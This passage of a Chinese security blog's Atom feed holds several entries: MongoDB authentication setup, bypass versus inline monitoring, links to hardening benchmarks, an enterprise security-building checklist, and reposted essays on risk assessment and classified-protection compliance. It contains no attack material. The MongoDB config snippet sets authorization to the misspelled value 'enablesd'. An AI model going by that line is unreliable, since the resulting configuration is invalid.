      &lt;p&gt;修改配置文件，开启认证&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# vi /etc/mongod.conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    security:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    authorization:&lt;/span&gt;enablesd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="mongodb" scheme="http://www.pa55w0rd.club/tags/mongodb/"/>
    
      <category term="数据库" scheme="http://www.pa55w0rd.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>旁路监控</title>
    <link href="http://www.pa55w0rd.club/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7/"/>
    <id>http://www.pa55w0rd.club/旁路监控/</id>
    <published>2018-11-01T05:33:11.000Z</published>
    <updated>2018-11-23T07:59:19.163Z</updated>
    
    <content type="html"><![CDATA[<p>常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。</p><p>“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。</p><p>而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。</p><a id="more"></a><p>旁路模式的优缺点</p><p><strong>优点：</strong></p><ul><li><p>旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。</p></li><li><p>旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。</p></li><li><p>旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，如无硬件bypass功能，会导致网络中断。</p></li></ul><p><strong>缺点：</strong></p><ul><li><p>需要交换机或者路由支持“端口镜像”功能才可以实现监控。</p></li><li><p>旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。&lt;/p&gt;
&lt;p&gt;“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。&lt;/p&gt;
&lt;p&gt;而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="基础知识" scheme="http://www.pa55w0rd.club/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>基线加固文档</title>
    <link href="http://www.pa55w0rd.club/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    <id>http://www.pa55w0rd.club/基线加固/</id>
    <published>2018-11-01T05:32:11.000Z</published>
    <updated>2018-11-23T07:59:01.778Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/re4lity/Benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/re4lity/Benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://learn.cisecurity.org/benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://learn.cisecurity.org/benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/ncp/repository&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://nvd.nist.gov/ncp/repository&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="基线加固" scheme="http://www.pa55w0rd.club/tags/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>甲方安全建设步骤 By pirogue</title>
    <link href="http://www.pa55w0rd.club/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/"/>
    <id>http://www.pa55w0rd.club/甲方安全建设步骤/</id>
    <published>2018-10-31T09:17:35.000Z</published>
    <updated>2018-11-21T08:50:13.296Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>资产梳理</p><ul><li>IP列表、业务分组(负责人、联系方向)、业务属性</li><li>业务端口</li><li>业务应用架构、技术堆栈</li></ul></li><li><p>边界安全，防火墙策略控制（需要梳理业务端口）</p></li></ol><a id="more"></a><pre><code>- 如果是硬件，使用防火墙统一控制- 如果是操作系统，Iptalbes＋IPSEC- 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)- 跳板机安全控制</code></pre><ol start="3"><li><p>账户安全管理</p><ul><li>弱密码</li><li>root、sudoer权限</li><li>账户、授权、访问、审计等等</li></ul></li><li><p>服务器安全</p><ul><li>安全基线检测</li><li>操作审计</li><li>异常登录审计(日志收集分析)</li><li>漏洞清点/扫描，补丁修复测试和推进</li></ul></li><li><p>WEB安全</p><ul><li>应用渗透测试</li><li>接口安全(加密、通信)</li><li>webshell实时监测</li><li>Nginx日志分析/Nginx流量旁路分析</li></ul></li><li><p>业务风控安全</p><ul><li>用户安全机制（密码、验证码、登录）</li><li>交易安全</li></ul></li><li><p>安全培训</p><ul><li>安全意识培训</li><li>运维安全培训</li><li>WEB安全开发</li></ul></li><li><p>安全规范和流程</p><ul><li>人员入职账户开通</li><li>人员离职账户注销</li><li>服务器上下架安全管理</li><li>安全应急响应机制</li></ul></li><li><p>内网安全</p><ul><li>内网服务器安全</li><li>账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)</li><li>弱口令监测(NTLM/LM)</li><li>账户异常登录</li><li>网络隔离（物理／虚拟化）</li><li>网络准入</li><li>PC安全（病毒统一管理、通知处理）</li></ul></li></ol><p><strong>一张图看透办公网安全 -Eleven</strong></p><p><img src="\assets\img\办公网安全.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;资产梳理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP列表、业务分组(负责人、联系方向)、业务属性&lt;/li&gt;
&lt;li&gt;业务端口&lt;/li&gt;
&lt;li&gt;业务应用架构、技术堆栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;边界安全，防火墙策略控制（需要梳理业务端口）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="内网安全" scheme="http://www.pa55w0rd.club/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>企业安全建设中评估业务潜在风险的思路（转发）</title>
    <link href="http://www.pa55w0rd.club/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>http://www.pa55w0rd.club/企业安全建设中评估业务潜在风险的思路/</id>
    <published>2018-10-31T09:16:35.000Z</published>
    <updated>2018-11-21T08:49:45.373Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>From : <a href="https://xz.aliyun.com/t/1529/" target="_blank" rel="noopener">elknot@360corpsec</a></p></blockquote><h2 id="0x00-写在前面："><a href="#0x00-写在前面：" class="headerlink" title="0x00 写在前面："></a>0x00 写在前面：</h2><p>昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。</p><h2 id="0x01-所谓安全攻击态势是什么"><a href="#0x01-所谓安全攻击态势是什么" class="headerlink" title="0x01 所谓安全攻击态势是什么"></a>0x01 所谓安全攻击态势是什么</h2><a id="more"></a><p>跟巨佬的进一步聊天中，我大概明白了甲方的意思：对下属子公司进行考核。其实巨佬自己也知道这个模型偏向于管理而非技术，只是需要技术数据的支撑。那么实际上其实根据我个人的理解就是：客户需要把业务系统所面临的潜在风险罗列出来，并且考核安全部门对于这些潜在风险的解决成果。</p><p>那么我们的思路就逐渐清晰了，我们需要了解的也就是业务系统会面临那些潜在的风险和安全部门应对这些风险的技战术手段。</p><h2 id="0x02-业务系统潜在风险"><a href="#0x02-业务系统潜在风险" class="headerlink" title="0x02 业务系统潜在风险"></a>0x02 业务系统潜在风险</h2><p>但从业务系统的潜在风险来判断的话，很多人第一反应就是日志，换句话说，很多领导要是问安全部门的同事我们系统的潜在风险是什么，经验不足的安全管理人员可能会马上从SIEM中抽取相关的安全日志（如果连SIEM都没有的话，那就是只能亲自动手去所有的安全设备的日志中逐条检索，所以针对大型的系统而言，规模越大SIEM的需求也就越高），然后按照攻击事件的数量排序，最后给出来一个所谓的“业务安全潜在风险分析报告”。但是各位仔细想一下就会发现这份报告实际上是有问题的，首先领导要的是“业务系统潜在风险”，而非是“已经发生的安全事件的统计”，换句话说安全部门提供的报告是领导期望的。那么如何评定业务系统的潜在风险呢？</p><p><strong>（1）业务系统活跃指数</strong></p><p>首先，针对一个系统而言，业务系统的活跃指数也就是能够被人访问到的几率是一个指标，如果这个业务系统被网络隔离了，也就只有内部的人可以访问的到，那么攻击面就大大减小了。那么如何判断这个系统的活跃指数呢。个人认为PV、UV、搜索引擎排名和Alexa指数这四个数据可以一定程度上来描述业务系统的活跃指数，PV、UV越大、搜索引擎排名越高、Alexa指数越高则说明了该系统被互联网用户访问到的可能性就越大，意味着被攻击的概率也就越高。</p><p><img src="\assets\img\xss\1.jpg" alt=""></p><p>上面这张图表示的就是Alexa的指数，指数越高也就是用户访问越频繁。当然这个只是其中的一方面，越活跃不一定代表受攻击的可能越大。</p><p><strong>（2）业务安全风险评定</strong></p><p>活跃指数只能判断出该业务系统被访问的次数，但是这仅仅是外因。被攻击的可能起决定因素的不是外因而是内因。所谓的内因也就是业务系统资深的原因，比如说用了不安全的框架、中间件存在已知漏洞、管理平台弱口令等等，然而这些问题其实解决起来不是特别的容易，一方面原因是业务系统稳定之后不太可能进行大范围的重构，二是因为开发部门对于安全方面可能不是特别懂，甚至有些大哥直接把测试环境部署到外网上去。</p><p>其实这些问题如果企业按部就班的走SDL的话，问题应该不大，因为SDL对于系统的安全开发存在一步威胁建模，就比如下面这张图：</p><p><img src="\assets\img\威胁类别与应对策略.png" alt=""></p><p> STRIDE威胁建模其实是一个很好的评估手段，但是很不幸，很多业务并不会去遵守这一套，这里安全部门就要多跑腿了，要定期对业务系统进行主动的渗透测试和安全监测，保证业务系统不存在可以被恶意利用的漏洞，</p><p> <strong>（3）历史攻击攻击行为比对</strong></p><p>这一部分其实就是从SIEM中抽取对应业务系统的安全日志，然后将其统计分类最后按照影响范围统计出来攻击的行为，但是这么做的话还远远不够，因为攻击日志里面有些是成功的有些是失败的，有些是人产生的有些是机器产生的。判断历史攻击行为的时候应当注意以下几点：</p><ol><li>确保SIEM中日志的有效性和准确性</li><li>统计攻击事件中成功次数与总次数所占的比例</li><li>列出所有攻击行为有特点的IP进行简单溯源</li><li>对攻击成功的IP进行重点监测并进行针对性溯源</li><li>回顾以往众测或者企业SRC收上来的漏洞利用报告</li></ol><p>这样的话你将会得到：</p><ul><li>一份带有详细数据的事件统计报告</li><li>一份发起攻击行为IP的列表</li><li>一份成功发起攻击行为IP的列表</li><li>N份漏洞利用及分析报告</li></ul><p>统计完成之后接下来就可以进行下一环节。</p><p><strong>（4）IP溯源及引入情报体系</strong></p><p>上面我们得到了一些攻击IP的数据，有些是成功的有些是失败的，这时候我们可以利用外部的威胁情报数据对这些IP进行浅层次或者深层次的溯源，浅层次的溯源主要是针对发起攻击但是失败的，需要收集的信息包括：IP的信誉度、地理位置、绑定的域名、域名注册时间、接入类型、被恶意标记的内容。</p><p>这些信息可以帮助我们去判断这些IP是不是肉鸡还是真实的攻击者，举个例子，假设一个IP的是一个荷兰OVH的主机，对我们输出的日志大多数都为扫描、注入类型的攻击，我们只接通过网络策略把这个IP拉黑了就可以了，因为他不是一个真是的攻击者而是一台肉鸡。相反的，如果一个IP攻击的行为包括社工、撞库、恶意漏洞利用、shell管理，并且接入方式是家庭宽带动态IP，那么这个IP我们就应该重点关注，甚至对其进行更深层次的溯源分析。</p><p>所谓深层次溯源分析，针对的主要是一些攻击行为有特点且明显不是自动化行为的攻击，比如上面那个例子。深层的溯源不是要把这个人的户口本全查一遍，然后家里几亩地，地里几头牛这些全都搞出来。之前我在ISC2017的大数据威胁分析论坛上面分享过我个人的观点——真的没必要大费周章把攻击的人直接抓出来，劳民伤财又费力不讨好，甚至没准还会触犯法律。我们需要明白的是攻击者瞄准的目标、攻击的套路和攻击者到底是出于什么样的目的攻击就足够了。</p><p>针对高级的溯源，我们需要采集的数据是：</p><ul><li>攻击者使用的基础设施</li><li>攻击者的意图</li><li>攻击者的成功率</li><li>攻击者的Kill-Chain模型</li><li>攻击者瞄准的行业和系统</li></ul><p>那么实际上高级溯源的结果我们也是有所区分的，比如说某些攻击者满天撒网导出扫描，抓到一个搞一个，这种的攻击者其实是没有价值的，通过网络策略直接ban了就完了。但是如果瞄准特定行业，攻击手段比较黑科技，而且Kill-Chain完整，攻击能力稳准狠，对待这种攻击者我们就应该去重点观察一下了，比如说把他的所有流量通过流量牵引到蜜罐里，观察他的操作。</p><p>其实说到这里，我们研究了所有的攻击者，可以把攻击我们的人都是什么来路摸清楚了。</p><p><strong>（5）SOC团队素质</strong></p><p>敌人分析完了，我们自己人也得分析分析，分析自己人最好的方法其实就是三个场景：重保、演习和众测。</p><p>出去前一个是有个别地方有需求，其他的两个都是可以找第三方团队去做的，主要目的是为了测试SOC针对外部威胁如何快速准确定位然后消灭威胁。</p><p>根据PDR模型来判断，如果响应时间Rt和检测时间Dt事件越短，同时防御时间Pt可以做到足够的长。攻击者得手的可能性越低。</p><h2 id="0x03-写报告"><a href="#0x03-写报告" class="headerlink" title="0x03 写报告"></a>0x03 写报告</h2><p>笔者个人认为态势感知不是跟x管家、x卫士那种随便打个分数就完了，态势感知的目的是为了给客户提供潜在的攻击行为和应对的策略，应该是完整的建议。态势感知如果要是打分的话这个产品一定是假的，大家不要相信。</p><p>如果输出报告的话，报告中应包含</p><ul><li>内因分析：威胁建模、安全手段评估、SOC素质、渗透测试和众测等</li><li>外因分析：业务系统活跃度、对外ACL、外部情报数据和对攻击者的认知。</li></ul><p>具体怎么写，相信愿意看这篇文章的人应该都比我懂。</p><p><strong>p.s.</strong> 文章仅代表个人观点，不代表其它的观点。</p><p><strong>Q：</strong>评价业务安全风险的时候，是不是也应该包括业务所处基础环境的安全风险（物理、所处网络环境、操作系统及一些框架之类的）？</p><p><strong>A：</strong>首先，您说的这些东西都是包含在内的，这一部分都已经集成到SDL和威胁建模环节，具体的一个业务上线流程请看</p><p><img src="\assets\img\xss\3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;From : &lt;a href=&quot;https://xz.aliyun.com/t/1529/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;elknot@360corpsec&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-写在前面：&quot;&gt;&lt;a href=&quot;#0x00-写在前面：&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面：&quot;&gt;&lt;/a&gt;0x00 写在前面：&lt;/h2&gt;&lt;p&gt;昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-所谓安全攻击态势是什么&quot;&gt;&lt;a href=&quot;#0x01-所谓安全攻击态势是什么&quot; class=&quot;headerlink&quot; title=&quot;0x01 所谓安全攻击态势是什么&quot;&gt;&lt;/a&gt;0x01 所谓安全攻击态势是什么&lt;/h2&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="安全评估" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
      <category term="业务安全" scheme="http://www.pa55w0rd.club/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>互联网企业的等级保护建设之路（转发）</title>
    <link href="http://www.pa55w0rd.club/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%BB%BA%E8%AE%BE%E4%B9%8B%E8%B7%AF/"/>
    <id>http://www.pa55w0rd.club/互联网企业的等级保护建设之路/</id>
    <published>2018-10-31T09:16:35.000Z</published>
    <updated>2018-11-21T08:50:46.955Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>From : <a href="http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/" target="_blank" rel="noopener">http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。</p><a id="more"></a><h2 id="0x01-序-互联网企业的兴盛与隐患"><a href="#0x01-序-互联网企业的兴盛与隐患" class="headerlink" title="0x01 序-互联网企业的兴盛与隐患"></a>0x01 序-互联网企业的兴盛与隐患</h2><p>1994年，中国通过一条64K的国际专线接入互联网。20年后，互联网带给整个中国经济模式的改变已经影响到了社会的方方面面。可以说，互联网极大地改变了中国，而这种改变仍在继续。</p><p>中国拥有庞大的网民数量，大量的需求被创造，给新的互联网行业形态出现奠定良好基础。其次，中国互联网行业的商业模式日渐成熟。网络广告、搜索引擎、电子商务、网络支付等业务日渐被人接受，各大互联网公司从各自核心领域优势向这几个方面渗透，形成有序竞争，带动互联网行业良性发展。再次，中国网络基础设施的建设、4G/5G互联网的发展、国家政策的扶持规划，均给整个互联网行业创造了一个非常好的前景。</p><p>中国的互联网企业发展迅速，目前已有多家跻身全球互联网公司市值排行榜top10中，像大家熟知的阿里巴巴、京东、腾讯及百度均榜上有名。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/1-300x169.jpg" alt=""></p><p>相对于传统行业，互联网行业还显得很年轻，在一派欣欣向荣的快速发展背后，互联网行业同时隐藏着让人难以捉摸的巨大的安全风险，由于技术和监管的诸多问题，使得该行业已陷入危机四伏的困境中。</p><p>2016年4月3日，土耳其爆发重大数据泄露事件，近5000W土耳其公民个人信息被黑客打包放置网络上任人下载。为证明被盗数据的真实性，黑客还公布土耳其现任总统埃尔多安的个人信息以作示范。</p><p>2016年7月29日，越南两个机场被黑客攻击，这是越南遭受迄今最严重的黑客攻击事件。黑客通过攻陷机场电子显示屏及广播系统，散发“南海是中国的固有领土”等信息，给机场候机的乘客带来视觉和听觉上的冲击，造成的混乱远超常见的攻击网页行为。</p><p>而在最近披露的一项报道中，俄罗斯黑客成功盗取了2.723亿个帐号，以俄罗斯最受欢迎的电子邮件服务Mail.ru用户为主，此外还有Gmail地址、雅虎以及微软电邮Hotmail用户。数以亿计的数据目前正在“俄罗斯的地下黑市”出售。</p><p>不只是境外企业，国内互联网企业也正在成为最大的受害者。2016上半年，全国互联网企业安全漏洞总量同比增长181.9%。相关人士表示，目前互联网行业存在很大的安全隐患，而且伴随着相当程度的数据泄露风险。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/2-300x169.jpg" alt=""></p><h2 id="0x02-起-黑客重点攻击的行业目标"><a href="#0x02-起-黑客重点攻击的行业目标" class="headerlink" title="0x02 起-黑客重点攻击的行业目标"></a>0x02 起-黑客重点攻击的行业目标</h2><p>作为一种新生事物，互联网企业起步于民营企业，很多小平台风险意识淡薄，把关注重点放在扩大客户规模、赚取利润上。而技术防护则严重缺失，另外出于成本考虑，大多数企业采用廉价的开源系统，这些系统存在大量风险漏洞，安全性严重缺乏保障，企业数据安全岌岌可危。那么知名大企业又如何呢？随着互联网技术的发展，黑客技术也在升级，企业投入巨大财力和人力研发的系统，同样存在不可预知的问题。因此，也不可避免的遭受黑客的恶意攻击。近年来，知名大企业数据泄露事件频频发生，逐年增多。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/3-300x169.jpg" alt=""></p><p>据调查统计，黑客攻击互联网企业平台的目的主要为窃取数据，占比高达48%，其次为敲诈勒索和商业竞争。</p><p>通过攻陷大批互联网企业平台，引起系统瘫痪，黑客还能将数据恶意修改、洗劫一空。此外，黑客还可能通过申请账号、篡改数据、冒充投资人进行恶意提现甚至盗取资金。</p><p>企业数据泄露，造成的不只是业务的巨大损失，更为重要的是信誉上的丧失。互联网企业的门户网站作为信誉展示的首要平台，如果因为网站信息泄露、宕机、页面篡改等原因导致用户信任丧失，那么平台也就丢失了本身的信誉，成为无源之水。</p><p>因此，互联网企业如何有效保护信息安全，事关企业生死存亡。</p><h2 id="0x03-转-国家信息安全的基本保障制度"><a href="#0x03-转-国家信息安全的基本保障制度" class="headerlink" title="0x03 转-国家信息安全的基本保障制度"></a>0x03 转-国家信息安全的基本保障制度</h2><p>互联网行业是需要依托互联网的，其核心业务需要IT系统的支撑，因此安全是首当其冲的。而等级保护是国家推行的在Cyber空间安全的强制保护制度，其最终目的是保护信息系统和基础信息网络不受到侵害，保护用户的业务数据和系统的服务功能。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/4-300x56.jpg" alt=""></p><p>从1994年国务院颁布的《中华人民共和国计算机信息系统安全保护条例》（147号令）开始，到今年（2016年）10月份在昆明举办的由公安部网络安全保卫局、中央网信办网络安全协调局、工信部网络安全管理局、国家密码管理局、国家保密局、中国科学院办公厅为指导单位和由公安部第三研究所主办的第五届全国信息安全等级保护技术大会上提出的进入等级保护制度2.0时代为止，等级保护这一项国家政策已经走过逾20个年头，等级保护不仅是对信息安全产品或系统的检测、评估以及定级，更重要的，它是围绕信息安全保障全过程的一项基础性的国家管理制度，是一项基础性和制度性的工作。</p><p>如何帮助互联网企业有效的防范网络入侵、网络拒绝服务攻击以及网络非法监听等恶意网络行为，就有必要了解相应的合规要求。而国家等级保护标准中对于网络安全方面的要求，特别是对网络安全管理、访问控制、入侵防范、网络设备防护、安全审计的相关条款对于和网络密不可分的互联网企业来说，确实有着十分重要且重大的意义。</p><h2 id="0x04-赋-等级保护之于互联网企业的意义"><a href="#0x04-赋-等级保护之于互联网企业的意义" class="headerlink" title="0x04 赋-等级保护之于互联网企业的意义"></a>0x04 赋-等级保护之于互联网企业的意义</h2><p>在互联网产业不断融合的态势下，互联网跨界融合竞争的趋势越发凸显，线上与线下问题不断交织，新现象、新问题不断涌现，政府的管理也面临前所未有的挑战。因此从2015年，工信部开始进一步加强和改进互联网行业管理，促进互联网企业良性有序发展。”</p><p>信息安全是永远不变的话题，工信部部长苗圩认为应该高度重视我们所面临的严峻安全形势，大力提升网络与信息安全的保障能力。“促进互联网融合发展，安全是基础，更是保障，必须处理好安全与发展的关系，做到协调一致。不断健全互联网行业网络和信息安全机制，持续推进信息安全和体制化建设，推动完善网络安全的法律法规、标准体系，严格落实互联网企业信息安全的责任，加强网络信息安全监管和网络环境的综合治理。”</p><p>除却自身发展面临的网络安全问题，国家有关部门对互联网行业网络安全方面的监管力度也逐年增加。在内部需求和外部监管的双重压力下，加快互联网企业信息安全等级保护建设显得迫在眉睫。</p><p>国家等级保护的核心思想：</p><ul><li>全方位划分安全等级是实施信息安全等级保护的基本条件；</li><li>信息系统等级化安全设计是实施信息安全等级保护的基本方法。</li><li>信息安全技术和信息安全管理是实现信息系统安全的基础。企业必须根据安全建设目标将需求分析结果进行逐步细化，并转化为信息安全体系建设的总体安全策略，根据登记保护建设的具体要求，可以形成技术层面的安全管理和管理层面的安全策略并通过总体安全策略的落实构建安全技术体系和安全管理体系框架。对于互联网企业来说，实施信息安全等级保护测评能够有效地提高企业信息系统安全建设的整体水平，有效控制企业信息安全建设成本；有利于明确国家、法人和其他组织、公民的信息安全责任，加强企业信息安全管理。</li><li>对于企业的信息系统来说，通过等级保护测评可及时发现信息系统安全状况并制定方案进行整改，当信息系统完全达到安全保护能力要求时，信息系统就基本可做到“<strong>进不来、拿不走、改不了、看不懂、跑不了、可审计、打不垮</strong>”。</li><li>对抗能力和恢复能力已然构成了信息系统的安全保护能力。安全保护能力主要表现为信息系统应对威胁的能力，但当信息系统无法阻挡威胁对自身的破坏时，信息系统的恢复能力使系统在一定时间内恢复到原有状态，从而降低负面影响。</li><li>对信息安全技术和信息安全管理进行等级划分是信息系统安全等级保护的需要，也是对信息安全技术和信息安全管理进行规范化的需要。</li></ul><h2 id="0x05-比-互联网企业的等级保护解决方案"><a href="#0x05-比-互联网企业的等级保护解决方案" class="headerlink" title="0x05 比-互联网企业的等级保护解决方案"></a>0x05 比-互联网企业的等级保护解决方案</h2><p>按照国家信息安全等级保护的相关标准，互联网企业一般通过第三方测评机构或安全厂商按照如下流程进行等保建设：</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/01/5-300x99.jpg" alt=""></p><p>同时，按照等级保护中针对技术和管理的不同要求，应持续开展如下工作：</p><ul><li>【保障基础设施安全】保障网络周边环境和物理特性引起的网络设备和线路的持续使用。</li><li>【保障网络连接安全】保障网络传输中的安全，尤其保障网络边界和外部接入中的安全。</li><li>【保障计算环境的安全】保障操作系统、数据库、服务器、用户终端及相关商用产品的安全。</li><li>【保障应用系统安全】保障应用程序层对网络信息的保密性、完整性和信源的真实的保护和鉴别，防止和抵御各种安全威胁和攻击手段，在一定程度上弥补和完善现有操作系统和网络信息系统的安全风险。</li><li>【保障数据安全及备份恢复】保障数据完整性、数据保密性、备份和恢复等。</li><li>【安全管理体系保障】根据国家有关信息安全等级保护方面的标准和规范要求，建立一套切实可行的安全管理体系，加强安全管理机制。</li></ul><h2 id="0x06-兴-巨人背后的安全专家"><a href="#0x06-兴-巨人背后的安全专家" class="headerlink" title="0x06 兴-巨人背后的安全专家"></a>0x06 兴-巨人背后的安全专家</h2><p>针对互联网企业的信息安全等级保护建设，绿盟科技作为国内安全厂商当仁不让的领军品牌，基于对信息安全的深刻理解，以为互联网客户信息系统构建“等级化的安全体系”为等级保护工作的服务理念，旨在根据等级保护不同等级、不同阶段的业务特性、安全需求及安全应用重点，为互联网客户在等级保护的框架下构建一个安全、可靠、灵活、可持续改进的信息安全体系。</p><p><img 